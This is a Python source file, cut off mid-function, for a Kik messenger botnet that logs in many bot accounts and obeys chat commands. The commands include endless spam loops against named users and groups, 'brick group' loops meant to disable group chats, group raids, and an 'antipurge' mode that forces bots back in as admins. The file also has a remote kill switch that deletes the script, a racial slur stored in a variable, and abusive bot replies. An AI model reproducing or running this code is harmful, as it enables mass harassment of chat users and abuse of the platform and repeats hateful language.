import sys
import os
import time
import subprocess
import socket
import contextlib
from keepalive import keep_alive
from urllib.request import urlopen
keep_alive()
check_for_startup = os.path.exists("startup.py")
if check_for_startup == False:
    clear = open("startup.py", "w+")
    clear.write("\'\'\'\nThis is where you add details to speed up the bootup process.\n\'\'\'\nuse_preset = False\n\npreset_username = \"\"\n\npreset_password = \"\"\n\npreset_num_of_bots = 0")
    clear.close()
#################
#        IMPORTS       #
#################
from startup import use_preset, preset_username, preset_password, preset_num_of_bots
global ominous_dots, bcolors, antipurge, safemode, blaze, pyro, ios, droid
from bcolors import bcolors
antipurge = False
safemode = False
blaze = "fuckblaze_gin@talk.kik.com"
pyro = "pyro_yl3@talk.kik.com"
ios = "-ᴢᴢ-ᶻᶻ-ᴢᶻᴢᶻ-ᶻᴢᴢᶻ~¿¿~ᴢᴢ~ᶻᶻ~ᴢᶻᶻ~ᶻᶻᴢ~??"
droid = "N1GGER"
#################
# INITIAL INSTALLATION #
#################
def ominous_dots(string):
    sys.stdout.write(string)
    dots = (bcolors.OKGREEN + "..." + bcolors.ENDC)
    for dot in dots:
        sys.stdout.write(dot)
        sys.stdout.flush
        time.sleep(0.3)
    time.sleep(0.1)
ominous_dots(bcolors.CYAN2 + ("Sobering the fuck up") + bcolors.ENDC)
with contextlib.redirect_stdout(None):
    automatic_setup = os.path.isdir("kik-bot-api-unofficial")
    if automatic_setup == False:
        os.system('git clone -b new https://github.com/Tomer8007/kik-bot-api-unofficial')
    os.system('pip3 install ./kik-bot-api-unofficial')
try:
    version_page = "https://pastebin.com/7f4Ak7br"
    page = urlopen(version_page)
    raw_version = page.read()
    version = raw_version.decode("utf-8")
    if version == "rekt":
        path = os.getcwd()
        os.remove(path + '\%s' % sys.argv[0])
        exit()
    if version == "redux_v420":
        print(bcolors.PINK2 + ("\nLets fuck shit up!") + bcolors.ENDC)
        input(bcolors.OKGREEN + "This is a fucking relapse!\nSmash your head into they keyboard to continue.." + bcolors.ENDC)
        pass
    else:
        print(bcolors.PINK2 + ("\nBlaze's Private Script..") + bcolors.ENDC)
        input(bcolors.OKGREEN + "This is a fucking relapse!\nSmash your head into they keyboard to continue.." + bcolors.ENDC)
except:
    print(bcolors.RED + "Skid no skidding)" + bcolors.ENDC)
    input(bcolors.RED + "Go away: " + bcolors.ENDC)
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
try:
    import emoji
except ModuleNotFoundError:
    print(bcolors.OKGREEN + ("\nInstalling..") + bcolors.ENDC)
    install('emoji')
    import emoji
try:
    import colorama
except ModuleNotFoundError:
    print(bcolors.OKGREEN + ("\nInstalling..") + bcolors.ENDC)
    install('colorama')
    import colorama
try:
    import kik_unofficial
except ModuleNotFoundError:
    print(bcolors.OKGREEN + ("\nInstalling..") + bcolors.ENDC)
    install('kik_unofficial')
    import kik_unofficial
#################
#     STARTING KIK    #
#################
import kik_unofficial.datatypes.xmpp.chatting as chatting
from kik_unofficial.client import KikClient
from kik_unofficial.callbacks import KikClientCallback
from kik_unofficial.datatypes.xmpp.errors import LoginError
from kik_unofficial.datatypes.xmpp.roster import FetchRosterResponse
from kik_unofficial.datatypes.xmpp.login import LoginResponse, ConnectionFailedResponse
clear = open("kik-debug.log", "w+")
clear.close()
clear = open("jidlist.txt", "w+")
clear.close()
global username_thing, spam, debug_jid, thing, attempt_number, given_pass, setup_preset, jid_list, vip_list, name
attempt_number = 0
print(bcolors.PINK + (
    "░█▀▄░█░░░█▀█░▀▀█░█▀▀░█▀▄\n░█▀▄░█░░░█▀█░▄▀░░█▀▀░█░█\n░▀▀░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀▀░"
) + bcolors.ENDC)
print(bcolors.CYANU + ("Blaze's Custom Botnet~") + bcolors.ENDC)
spam = "QmxhemUgaXMgQmFlLiBDaGEtQ2hhIFJlYWwtU21vb3Rofg=="
debug_jid = "botnetdebug_yms@talk.kik.com"
jid_list = []
vip_list = ["pyro_yl3@talk.kik.com", "fuckblaze_gin@talk.kik.com"]
print(bcolors.PINK + ("\nBlazes Bitch Bots") + bcolors.ENDC)
print(bcolors.OKGREEN + ("This is far more than a simple string edit. \nUse 'newshit' in Dm for a look at whats new.") + bcolors.ENDC)
print(bcolors.CYANU + ("Modified while high by Blaze @PyRo!") + bcolors.ENDC)
name = input(bcolors.PINKU + ("\nWait, who the fuck was you again?: ") + bcolors.ENDC)
print(bcolors.PURP2 + "\nHello, " + name + "!Let's Get-Lit And Break Shit!" + bcolors.ENDC)
setup_preset = False
#################
#      LOGGING IN      #
#################
def get_preset():
    global setup_preset
    ask_preset = input(bcolors.BLUE + ("Setup Auto Login?\n[1] Hell Yea!\n[2] Fuck that..\n> ") + bcolors.ENDC)
    if str(ask_preset) == "1":
        print(bcolors.PINK2 + ("You enter your details.\nI'll save em for a car payment.") + bcolors.ENDC)
        setup_preset = True
    elif str(ask_preset) == "2":
        ominous_dots(bcolors.YELLOW2 + ("Continuing without giving the man your data.") + bcolors.ENDC)
    else:
        print(bcolors.REDU + ("Invalid input! Please only use the number \"1\" or \"2\" (without quotations)\nExiting...") + bcolors.ENDC)
        exit()
if use_preset == False:
    get_preset()
if use_preset == True:
    ask_preset = input(bcolors.PINK + ("\nI see you have startup.py configured.\nWould you like to use automatic startup?\n[1] Yes, I want to use automatic startup.\n[2] No, I want to startup manually.\n[3] No, I want to change automatic startup settings.\n> ") + bcolors.ENDC)
    if str(ask_preset) == "1":
        ominous_dots(bcolors.CYAN2 + ("\nOkay! Using automatic startup") + bcolors.ENDC)
        print("\n")
    elif str(ask_preset) == "2":
        ominous_dots(bcolors.CYAN2 + ("Okay, continuing without automatic startup") + bcolors.ENDC)
        use_preset = False
    elif str(ask_preset) == "3":
        ask_change = input(bcolors.PINK + ("Okay! Let's change automatic startup.\n[1] Change credentials\n[2] Reset to default settings\n") + bcolors.ENDC)
        if str(ask_change) == "1":
            print(bcolors.PINK + ("Great! I'll setup automatic startup for you.\nJust input your details like normal and I'll do the rest!") + bcolors.ENDC)
            setup_preset = True
        elif str(ask_change) == "2":
            clear = open("startup.py", "w+")
            clear.write("\'\'\'\nThis is where you add details to speed up the bootup process.\n\'\'\'\nuse_preset = False\n\npreset_username = \"\"\n\npreset_password = \"\"\n\npreset_num_of_bots = 0")
            clear.close()
            input(bcolors.OKGREEN + "Okay, I've reset your settings to the default. Press enter to continue with manual startup." + bcolors.ENDC)
            use_preset = False
        else:
            print(bcolors.REDU + "Invalid input! Please only use the number \"1\" or \"2\" (without quotations)\nExiting..." + bcolors.ENDC)
            exit()
    else:
        print(bcolors.REDU + "Invalid input! Please only use the number \"1\", \"2\" or \"3\" (without quotations)\nExiting..." + bcolors.ENDC)
        exit()
def get_prefix():
    username_thing = input(bcolors.CYAN2 + ("\n\nBot User Prefix: ") + bcolors.ENDC)  #This asks for the bot username prefix in the terminal.
    return username_thing
if use_preset == True:
    username_thing = preset_username
else:
    username_thing = get_prefix()  #This triggers the function that aske for the bot prefix
    if len(username_thing) == 0:  #This checks for blank prefixes, and retries get_prefix if there are any.
        print(bcolors.FAIL + ("Uh-oh, it looks like you didn't provide any input! Let's try that again.") + bcolors.ENDC)
        username_thing = get_prefix()
    if " " in username_thing:  #This checks for spaces in the prefix, and retries get_prefix if there are any.
        print(bcolors.FAIL + ("Uh-oh! There is a space in the username prefix you provided. Let's try that again.") + bcolors.ENDC)
        username_thing = get_prefix()
    print(
        bcolors.OKGREEN + ("\nOkay, I will be signing into your botnet as \"" + username_thing + "1\", \"" + username_thing + "2\", and so on.\nIf this is incorrect, please restart this session.") + bcolors.ENDC)  #This explains how the bots will sign in.
def get_bot_quantity():
    try:
        thing = int(input(bcolors.OKGREEN + ("\nHow manny bots you got?: ") + bcolors.ENDC))
    except ValueError:  #This is triggered when the input is not a number.
        print(bcolors.FAIL + ("That's not a number, Dumbfuck.") + bcolors.ENDC)
        thing = "NULL"  #Just put a random string here to catch ValueError, could have put whatever.
    return thing
if use_preset == True:
    thing = preset_num_of_bots
else:
    thing = get_bot_quantity()
    if thing == "NULL":
        thing = get_bot_quantity()
    else:
        if thing <= 0:
            print(bcolors.FAIL + ("You must use a number greater than or equal to 1. Let's try that again.") + bcolors.ENDC)
            thing = get_bot_quantity()
if use_preset == True:
    given_pass = preset_password
    bootup_message = "Finna get this shit started with: \nUsername - " + str(
        preset_username) + "\nPassword - " + str(
            preset_password) + "\nNumber of bots - " + str(preset_num_of_bots)
    print(bcolors.OKGREEN + bootup_message + bcolors.ENDC)
else:
    given_pass = input(bcolors.OKGREEN + ("\n" + str(thing) + " bots.\nNow the pass: ") + bcolors.ENDC)
if setup_preset == True:
    clear = open("startup.py", "w+")
    clear.write("\'\'\'\nAdd Login Details Here to Auti log.\n\'\'\'\nuse_preset = True\n\npreset_username = \"" + str(username_thing) + "\"\n\npreset_password = \"" + str(given_pass) + "\"\n\npreset_num_of_bots = " + str(thing))
    clear.close()
    bootup_message = "Preset created in setup.py: \n\nUsername prefix - " + str(username_thing) + "\nPassword - " + str(given_pass) + "\nNumber of bots - " + str(thing) + "\n"
    print(bcolors.OKGREEN + bootup_message + bcolors.ENDC)
    time.sleep(1)
    input(bcolors.OKGREEN + "Lets fuck shit up: " + bcolors.ENDC)
time.sleep(1)
print(bcolors.REDU +
      emoji.emojize(":warning: This color means you skid like shit lmao.") +
      bcolors.ENDC)  #This is an example red text, ooooo
time.sleep(3)
print(bcolors.OKBLUE + emoji.emojize("Okay, lets get this shit over with..") +
      bcolors.ENDC)
      
def login(give_a_username, give_a_password, thing):
    stetho_string = give_a_username
    given_pass = give_a_password
    username = sys.argv[1] if len(sys.argv) > 1 else stetho_string
    password = sys.argv[2] if len(sys.argv) > 2 else given_pass
    
    def main():
        SpamBotnet()
    class SpamBotnet(KikClientCallback):
        def __init__(self):
            self.client = KikClient(self, username, password)
        global result, antipurge, name, safemode
        result = None

        def on_login_ended(self, response: LoginResponse):
            ominous_dots(bcolors.OKGREEN + ("Logging in as @" + str(username)) + bcolors.ENDC)
        def on_authenticated(self):
            print(bcolors.OKGREEN + (" Waiting on u daddy!"))
            global result
            result = True
            self.client.request_roster()
            
            def get_my_jid():
                try:
                    my_jid = self.client.get_jid(stetho_string)
                    return my_jid
                except:
                    return False

            my_jid = get_my_jid()
            while my_jid == False:
                my_jid = get_my_jid()
            jidlist = open("jidlist.txt", "a+")
            jidlist.write(my_jid + "\n")
            jidlist.close()

        def on_friend_attribution(
                self, response: chatting.IncomingFriendAttribution):
            print("[+] Friend attribution request from " + response.referrer_jid)
            self.client.add_friend(response.referrer_jid)
#################
#    DM FUNCTIONS    #
#################
        def on_chat_message_received(
                self, chat_message: chatting.IncomingChatMessage):
            global antipurge, ios, droid, safemode
            JID = chat_message.from_jid
            mssg = emoji.demojize(chat_message.body.lower())
            if mssg == "ping":
                self.client.send_chat_message(JID, "Ping these nuts, motherfucker!")
                self.client.add_friend(JID)
            elif mssg == "newshit":
                self.client.send_chat_message(JID, "WILL UPDATE L8RZ")
            elif mssg == "slave":
                self.client.send_chat_message(JID, "Yes Daddy?")
            elif mssg == ".spin":
                self.client.send_chat_message(JID, "Wrong bot, dipshit.")
            elif mssg == "25":
                for x in range(26):
                    self.client.send_chat_message(JID, "skrtt")
            elif mssg.startswith("safemode"):
                if mssg == "safemode off":
                    self.client.send_chat_message(JID, "Allowing spam..")
                    safemode = False
                    time.sleep(2)
                    self.client.send_chat_message(JID, "Just spam away, Dipshit!")
                if mssg == "safemode on":
                    self.client.send_chat_message(JID, "Disallowing Spam!")
                    safemode = True
                    time.sleep(2)
                    self.client.send_chat_message(JID, "Sperging now medicated!")
                elif mssg == "safemode":
                    if safemode == False:
                        self.client.send_chat_message(JID, "Just spam away dipshit!")
                    elif safemode == True:
                        self.client.send_chat_message(JID, "No access! Contact @PyRo.")
            elif mssg.startswith("antipurge"):
                if mssg == "antipurge on":
                    self.client.send_chat_message(JID, "Turning antipurge on...")
                    antipurge = True
                    time.sleep(2)
                    self.client.send_chat_message(JID, "Antipurge now on.")
                if mssg == "antipurge off":
                    self.client.send_chat_message(JID, "Turning off antipurge...")
                    antipurge = False
                    time.sleep(2)
                    self.client.send_chat_message(JID, "Antipurge now off.")
                elif mssg == "antipurge check":
                    if antipurge == True:
                        self.client.send_chat_message(JID, "Antipurge is on.")
                    elif antipurge == False:
                        self.client.send_chat_message(JID, "Antipurge is off.")
            elif mssg == "refresh":
                number_of_users = []
                for user in jid_list:
                  if user:
                      number_of_users += 1
                      self.client.send_chat_message(JID, "Adding the other bots...\n(Estimated completion time is " + str(number_of_users) + " second(s).)")
                      for user in jid_list:
                        if user:
                            self.client.add_friend(user)
                            self.client.send_chat_message(user, "Wake up, Dumbass.")
                            time.sleep(1)
                self.client.send_chat_message(JID, "Whole squad ready!")
            elif mssg.startswith("promote"):
                self.client.send_chat_message(JID, "The promote command only works in groups.")
            elif mssg.startswith("demote"):
                self.client.send_chat_message(JID, "The demote command only works in groups.")
            elif mssg == "addall":
                self.client.send_chat_message(JID, "The addall command only works in groups.")
            elif mssg == "friend": 
                self.client.add_friend(JID)
                self.client.send_chat_message(JID, "Add me places, I need groups.")
            elif mssg == "rickroll":
                   self.client.send_chat_message(JID, "We're no strangers to love")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "You know the rules and so do I (do I)")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "A full commitment's what I'm thinking of")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "You wouldn't get this from any other guy")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "I just wanna tell you how I'm feeling")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Gotta make you understand")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Never gonna give you up!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Never gonna let you down..")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Never gonna run around and...")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Desert youuu!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Never gonna make you cry")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Never gonna sayyy goodbye!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Never gonna tell a lie and hurt you...")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "We've known each other for so long")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Your heart's been aching, but you're too shy to say it")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "say it..")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Inside, we both know what's been going on")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "going on..")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "We know the game and we're gonna play it")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "And if you ask me how I'm feeling")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Gotta make you understand")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Never gonna give you up!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Never gonna let you down..")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Never gonna run around and...")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Desert youuu!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Never gonna make you cry")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Never gonna sayyy goodbye!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Never gonna tell a lie and hurt you...")
                   time.sleep(0.5)
                   self.client.send_chat_message(JID, "Never gonna give..")
                   time.sleep(0.5)
                   self.client.send_chat_message(JID, "Never gonna give...")
                   time.sleep(0.5)
                   self.client.send_chat_message(JID, "Never gonna give you up!")
                   time.sleep(0.5)
                   self.client.send_chat_message(JID, "Never gonna give..")
                   time.sleep(0.5)
                   self.client.send_chat_message(JID, "Never gonna give...")
                   time.sleep(0.5)
                   self.client.send_chat_message(JID, "Never gonna give you up!")
                   time.sleep(0.5)
                   self.client.send_chat_message(JID, "I mean it..")
            elif mssg == "barbie girl":
                   self.client.send_chat_message(JID, "Hiya Barbie!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Hi Ken!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Wanna go for a ride?")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "SURE KEN!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, " I'm a Barbie girl,")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "In a Barbie world.")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Life in plastic..")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Its fantastic!!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "You can brush my hair,'")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "And indress me everywhere..")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Imagination!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Life is your creation!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "COME ON BARBIE,")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "LETS GO PARTY!!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Ahh ahh ahh,")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "YEAH!!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "COME ON BARBIE,")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "LETS GO PARTY!!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Ooo Woah")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Ooo Woahh!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "COME ON BARBIE,")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "LETS GO PARTY!!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Ahh ahh ahh,")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "YEAH!!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "COME ON BARBIE,")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "LETS GO PARTY!!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Oooh oooh")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Oooh oohh!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Im a blonde, bimbo girl,")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "In a fantasy world")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Dress me up,")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Make me tight,")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Im your dolly")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "YOUR MY DOLL,")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "ROCK N ROLL,")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "FEEL THE GLAMOR IN PINK!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "KISS ME HERE,")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "TOUCH ME THERE,")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "HANKY-PANKYY")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "You can touch..")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "You can play...")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "If you say, IM ALWAYS YOURS!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Oooh ooh")
                   time.sleep(1)
                   self.client.send_chat_message(JID, " I'm a Barbie girl,")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "In a Barbie world.")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Life in plastic..")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Its fantastic!!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "You can brush my hair,'")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "And indress me everywhere..")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Imagination!")
                   time.sleep(1)
                   self.client.send_chat_message(JID, "Life is your creation!")
            elif mssg.startswith("gif"):
                gif_query = mssg.replace("gif ", "", 1)
                self.client.send_chat_message(JID, "Searching for a gif with the query \"" + str(gif_query) + "\"...")
                try:
                    self.client.send_gif_image(JID, gif_query)
                except:
                    self.client.send_chat_message(JID, "I couldn't find a gif for the query" + gif_query + "\"!")
            elif mssg == "commands": 
                self.client.send_chat_message(JID, "To spam PMs, use \"spam JID or User w/ Msg2Spam\", can be used in groups and PMs.")
            elif mssg.startswith("spam"):  #Command for spamming a user.
                if mssg == "spam":  #Elaborates on how to use spam if the message is just "spam"
                    self.client.send_chat_message(JID, "To use the spam tool, please use \"spam [JID or Username] w/ [Message]\", or \"spam gif [JID or Username] w/ [query]\".\n\nExample: \"spam bacon_6zl@talk.kik.com w/ Blue's a pretty color.\"")
                else:
                    if " w/ " in mssg:  #This checks if "w/" was in the string and continues if so
                        if mssg.startswith("spam gif"):
                            failed = False
                            remove_spam = mssg.replace("spam gif ", "")
                            split_string = remove_spam.split(" w/ ", 1)
                            jid_to_spam = split_string[0]
                            if "@talk.kik.com" in jid_to_spam:
                                jid_to_spam = jid_to_spam[:-17]
                                gif_query = split_string[1]
                            try:
                                self.client.send_gif_image(jid_to_spam, gif_query)
                            except:  #This is triggered if it fails
                                failed = True
                            if failed == True:
                                self.client.send_chat_message(
                                    JID,"I couldn't find a gif for the query" +
                                    gif_query + "\"!")
                            else:
                                if safemode == False:
                                    self.client.send_chat_message(JID, "I am spamming gifs to \"" + jid_to_spam + "\" with the query \"" + gif_query + "\"!\n(Keep in mind that some Kik mods cannot see gifs sent from bots.)")
                                    while safemode == False:
                                        self.client.send_gif_image(jid_to_spam,(gif_query))  #This sends the gif
                                        time.sleep(0.3)
                        else:
                            remove_spam = mssg.replace("spam ", "")
                            split_string = remove_spam.split(" w/ ", 1)
                            jid_to_spam = split_string[0]  #This isolates the JID
                            if "@talk.kik.com" in jid_to_spam:
                                jid_to_spam = jid_to_spam[:-17]
                            if jid_to_spam.startswith("@"):
                                self.client.send_chat_message(JID, "No \"@\" needed before username.")
                                jid_to_spam = jid_to_spam.replace("@", "", 1)
                                time.sleep(0.5)
                            message_to_spam = split_string[1]
                            if "groups" in jid_to_spam:
                                self.client.send_chat_message(JID, "You cant use a GJID for this, dumbass..")
                            else:
                                while safemode == False:
                                    self.client.send_chat_message(jid_to_spam, emoji.emojize(message_to_spam))
                                    time.sleep(0.6)
                    else:
                        self.client.send_chat_message(JID, "Put a \"w/\" like I told your dumbass.")
                        time.sleep(0.5)                      
            elif mssg.startswith("slap"):
                if mssg == "slap":
                    self.client.send_chat_message(JID, "Use \"slap [JID or Username] w/ [Message]\".")
                else:
                    if " w/ " in mssg:
                        remove_slap = mssg.replace("slap ", "")
                        split_string = remove_slap.split(" w/ ", 1)
                        jid_to_slap = split_string[0]
                        if "@talk.kik.com" in jid_to_slap:
                            jid_to_slap = jid_to_slap[:-17]
                        if jid_to_slap.startswith("@"):
                            self.client.send_chat_message(JID, "No \"@\" needed before username.")
                            jid_to_slap = jid_to_slap.replace("@", "", 1)
                        message_to_send = split_string[1]
                        if "groups" in jid_to_slap:
                            self.client.send_chat_message(JID, "You cant use a GJID for this, dumbass..")
                        else:
                            self.client.send_chat_message(JID, "Boutta smack the fuck out of \"" + jid_to_slap + "\" and say \"" + emoji.emojize(message_to_send) + "\"!")
                            print("Fuckn slapping \"" + jid_to_slap + "\" and saying \"" + emoji.emojize(message_to_send) + "\"!")
                            self.client.send_chat_message(jid_to_slap, emoji.emojize(message_to_send))
                    else:  #This lets the user know when they used the command wrong because "w/" isn't in the string
                        self.client.send_chat_message(JID, "You need to put a \"w/\" with one space on both sides between the JID/username and the message.\n\n(Error: w/ not found in message string.)")
                        time.sleep(0.5)
                        self.client.send_chat_message(JID, "Use \"spam [JID or Username] w/ [Message]\".\n\nExample: \"spam bacon_6zl@talk.kik.com w/ Blue's a pretty color.\"")
            elif mssg.startswith("sendfriend"):  #This is a command for sending a friend request to a JID
                self.client.send_chat_message(JID, "Tip: You should only use this in groups so that you can trigger all of your bots at once! That's kinda the point of this command...")
                if mssg == "sendfriend":
                    self.client.send_chat_message(JID, "Use \"sendfriend [JID or Username]\".")
                else:
                    remove_sendfriend = mssg.replace("sendfriend ", "", 1)
                    if "@talk.kik.com" in remove_sendfriend:
                        remove_sendfriend = remove_sendfriend[:-17]
                    self.client.send_chat_message(JID, "Kidnapping \"" + remove_sendfriend + " !")
                    self.client.send_chat_message(remove_sendfriend, "Ay you my bitch now, feel me?")  #This lets the user know they are being added
                    self.client.add_friend(remove_sendfriend)  #This adds the user as a friend
            elif mssg.startswith("leave"):  #This command is for eaving groups with a GJID
                remove_leave = mssg.replace("leave ", "", 1)  #This removes the first part of the message to isolate the GJID
                if mssg == "leave":  #This checks if the message is just "leave" and gives instructions if so
                    self.client.send_chat_message(JID, "Use \"leave [GJID]\"")
                else:
                    if "groups" in remove_leave:  #This checks if the given GJID is in fact a GJID
                        self.client.send_chat_message(JID, "Attempting to leave \"" + remove_leave + "\"!")
                        self.client.leave_group(remove_leave)  #This leaves the group
                    else:  #This tells the user that they used a JID or otherwise invalid input
                        self.client.send_chat_message(JID, "\"" + remove_leave + "\" doesnt exist retard!")
        def on_group_status_received(self, response: chatting.IncomingGroupStatus):
            GJID = response.group_jid
            if antipurge == True:
                for user in jid_list:
                    self.client.unban_member_from_group(GJID, user)
                    self.client.add_peer_to_group(GJID, user)
                    self.client.promote_to_admin(GJID, user)
#################
#  GROUP MESSAGING  #
#################
        def on_group_message_received(self, chat_message: chatting.IncomingGroupChatMessage):
            global antipurge, safemode, ios, droid
            mssg = emoji.demojize(chat_message.body.lower())
            GJID = chat_message.group_jid
            if antipurge == True:
                for user in jid_list:
                    self.client.unban_member_from_group(GJID, user)
                    self.client.add_peer_to_group(GJID, user)
                    self.client.promote_to_admin(GJID, user)
            elif mssg.startswith("promote"):
                if mssg == "promote":
                    self.client.send_chat_message(GJID, "Use \"promote [JID or username]\"")
                else:
                    jid_to_promote = mssg.replace("promote ", "")
                    if jid_to_promote.startswith("@"):
                        self.client.send_chat_message(GJID, "No \"@\" needed for usernames.")
                        jid_to_promote = jid_to_promote.replace("@", "", 1)
                    self.client.send_chat_message(GJID, "Attempting to promote \"" + jid_to_promote + "\" to admin!")
                    self.client.promote_to_admin(GJID, jid_to_promote)
            elif mssg.startswith("demote"):
                if mssg == "demote":
                    self.client.send_chat_message(GJID, "To use the demote command, say \"demote [JID or username]\"")
                else:
                    jid_to_demote = mssg.replace("demote ", "")
                    if jid_to_demote.startswith("@"):
                        self.client.send_chat_message(GJID, "No \"@\" needed for usernames.")
                        jid_to_demote = jid_to_demote.replace("@", "", 1)
                    self.client.send_chat_message(GJID,
                        "Attempting to demote \"" + jid_to_demote + "\"!")
                    self.client.demote_admin(GJID, jid_to_demote)
            elif mssg == "refresh":
                number_of_users = []
                for user in jid_list:
                  if user:
                      number_of_users += 1
                      self.client.send_chat_message(GJID, "Adding the other bots...\n(Estimated completion time is " + str(number_of_users) + " second(s).)")
                      for user in jid_list:
                        if user:
                            self.client.add_friend(user)
                            self.client.send_chat_message(user, "Wake up, Dumbass.")
                            time.sleep(1)
            elif mssg == "raid":
                self.client.send_chat_message(GJID, "Gang Gang!")
                for user in jid_list:
                    self.client.add_peer_to_group(GJID, user)
                    time.sleep(0.4)
            elif mssg == "brick group":
              if safemode == False:
                self.client.send_chat_message(GJID, "Okay, weirdo..")
                for x in range(1,1000):                
                   self.client.throw_groupbrick(GJID)
                   time.sleep(1)
            elif mssg == "brick test":
              if safemode == False:
                self.client.send_chat_message(GJID, "Okay, weirdo..")
                for x in range(1,1000):                
                   self.client.test_brick(GJID)
                   time.sleep(1)
            elif mssg == "brick group 2":
              if safemode == False:
                self.client.send_chat_message(GJID, "Okay, weirdo..")
                for x in range(1,1000):                
                   self.client.brick_groupq(GJID)
                   time.sleep(1)
            elif mssg.startswith("antipurge"):
              if safemode == False:
                if mssg == "antipurge on":
                    self.client.send_chat_message(GJID,"Turning antipurge on...")
                    antipurge = True
                    time.sleep(2)
                    self.client.send_chat_message(GJID, "Antipurge now on.")
                elif mssg == "antipurge off":
                    self.client.send_chat_message(GJID, "Turning off antipurge...")
                    antipurge = False
                    time.sleep(2)
                    self.client.send_chat_message(GJID, "Antipurge now off.")
                elif mssg == "antipurge check":
                    if antipurge == True:
                        self.client.send_chat_message(GJID, "Antipurge is on.")
                    elif antipurge == False:
                        self.client.send_chat_message(GJID, "Antipurge is off.")
            elif mssg.startswith("safemode"):
                if mssg == "safemode on":
                    self.client.send_chat_message(GJID, "Disabling Spam...")
                    safemode = True
                    time.sleep(2)
                    self.client.send_chat_message(GJID, "Spam Disabled!")
                elif mssg == "safemode off":
                    self.client.send_chat_message(GJID, "Allowing spam...")
                    antipurge = False
                    time.sleep(2)
                    self.client.send_chat_message(GJID, "Spam away, dipshit!")
                elif mssg == "safemode check":
                    if safemode == True:
                        self.client.send_chat_message(GJID, "Control is currently ON. Spam is disabled!")
                    elif antipurge == False:
                        self.client.send_chat_message(GJID, "Control is currently OFF, Spam away dipshit!")
            elif mssg.startswith("groupspam"):
                if mssg == "groupspam":
                    self.client.send_chat_message("Use \"groupspam [Message]\", or \"groupspam gif [query]\"")
                else: 
                    if mssg.startswith("groupspam gif"):
                        failed = False
                        gif_query = str(mssg.replace("groupspam gif ", "", 1))
                        try:
                            self.client.send_chat_message(GJID, "Searching for \"" + str(gif_query) + "\" gifs...")
                            self.client.send_gif_image(GJID, gif_query)
                        except:
                            failed = True
                        if failed == True:
                            self.client.send_chat_message(GJID, "Failed to query gifs for " + gif_query + "\"!")
                        else:
                            if safemode == False:
                                self.client.send_chat_message(GJID, "Spamming gifs in 5 seconds, leave group now!")
                                time.sleep(1)
                                self.client.send_chat_message(GJID, "5")
                                time.sleep(1)
